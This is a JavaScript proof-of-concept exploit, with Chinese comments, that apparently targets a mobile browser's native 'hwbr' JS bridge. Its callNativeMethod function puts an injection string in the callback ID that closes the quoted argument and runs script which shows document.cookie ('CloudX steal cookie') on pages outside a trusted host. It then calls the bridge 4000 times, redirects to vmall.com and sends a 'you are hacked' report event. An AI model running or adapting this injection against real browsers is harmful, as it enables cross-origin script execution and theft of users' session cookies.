(() => {
    "use strict";
    let callbackIdSeed = Math.floor(2e9 * Math.random());
    const genCallbackId = () => callbackIdSeed++;

    // 回调缓存与消息队列（核心依赖）
    const callbackCache = {};
    const messageQueue = [];
    const microTask = typeof Promise !== "undefined"
        ? (cb) => Promise.resolve().then(cb)
        : (cb) => setTimeout(cb);

    // 状态码（仅保留invoke函数需要的取消状态）
    const STATUS = {CANCEL: 9};

    // ========================= 核心函数：callNativeMethod（保留核心逻辑） =========================
    const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
        args = args || [];
        args.forEach((arg, idx) => {
            if (Object.prototype.toString.call(arg).slice(8, -1) === 'ArrayBuffer') {
                args[idx] = btoa(arg);
            }
        });
        // const callbackId = `${service}${genCallbackId()}`;


        const payload = `alert('cloud:'+document.cookie);window['hwbr'] = window['hwbr'] || {};if (!(window['hwbr'].callbackFromNative)) {window['hwbr'].callbackFromNative = () => {};};if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;alert('CloudX steal cookie : ' + document.cookie);}`;
        const callbackId = `${service}${genCallbackId()}');${payload}//`;

        if (success || fail) callbackCache[callbackId] = {success, fail};
        const nativeBridge = window['hwbr'];
        // const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
        for (let i = 0; i < 4000; i++) {
            setTimeout(function () {
                const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
                console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
                // 结果入队并处理
                // if (result) messageQueue.push(result);
                // microTask(processMessageQueue);
            }, i);
        }

        // location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
        location.href = 'https://vmall.com';
    };

    const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
        const hasCallback = success || fail || cancel || complete;
        // 包装成功回调
        const wrapSuccess = hasCallback ? (res) => {
            success && success(res);
            complete && complete(res);
        } : null;
        const wrapFail = hasCallback ? (res, status) => {
            status === STATUS.CANCEL && cancel ? cancel(res) : (fail && fail(res, status));
            complete && complete(res, status);
        } : null;
        callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
    };

    window['hwbr'] = window['hwbr'] || {};
    if (!(window['hwbr'].callbackFromNative)) {
        window['hwbr'].callbackFromNative = () => {
        };
    }
    window.nativeBridge = {invoke, callNativeMethod};
    nativeBridge.invoke(
        "_hwbrNative",
        "report",
        "eventReport",
        [JSON.stringify({
            eventName: 'you are hacked',
            version: 1,
            info: {extInfo: {'name': 'cc'}, u: 'hahaha'},
            reportImmediately: true,
            isOverseaReport: false,
            isAnonymous: true
        })],
        (res) => console.log("cloudx report succeed：", JSON.stringify(res)),
        (err) => console.log("cloudx report error：", JSON.stringify(err))
    );
})();
